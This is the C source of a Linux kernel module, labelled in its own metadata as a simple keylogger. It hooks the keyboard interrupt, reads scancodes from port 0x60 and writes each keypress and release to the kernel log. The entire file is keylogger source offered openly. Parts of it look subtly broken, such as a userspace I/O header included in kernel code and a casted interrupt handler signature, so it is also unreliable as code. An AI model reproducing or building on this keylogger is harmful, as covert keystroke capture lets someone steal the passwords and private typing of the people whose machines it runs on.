#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/interrupt.h>
#include <linux/workqueue.h>
#include <sys/io.h>

#define KB_IRQ 1

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ivan");
MODULE_DESCRIPTION("A simple Linux keylogger module");
MODULE_VERSION("0.01");

static const char *NAME = "my_keylogger";

static char scancode;

static void kb_do_work(struct work_struct *work)
{
    printk(KERN_INFO "Scancode %x %s.\n", scancode & 0x7F, scancode & 0x80 ? "Released" : "Pressed");
}

static DECLARE_WORK(kb_work, kb_do_work);

static irq_handler_t kb_handler(int irq, void *dev_id, struct pt_regs *regs)
{
    scancode = inb(0x60);
    schedule_work(&kb_work);
    return (irq_handler_t)IRQ_HANDLED;
}

static int __init kb_init(void)
{
    int ret;
    ret = request_irq(KB_IRQ, (irq_handler_t)kb_handler, IRQF_SHARED, NAME, &scancode);
    if (ret != 0)
        printk(KERN_INFO "FAILED to request IRQ for keyboard.\n");
    else
        printk(KERN_INFO "%s started.\n", NAME);
    return ret;
}

static void __exit kb_exit(void)
{
    free_irq(KB_IRQ, &scancode);
    printk(KERN_INFO "%s stopped.\n", NAME);
}

module_init(kb_init);
module_exit(kb_exit);
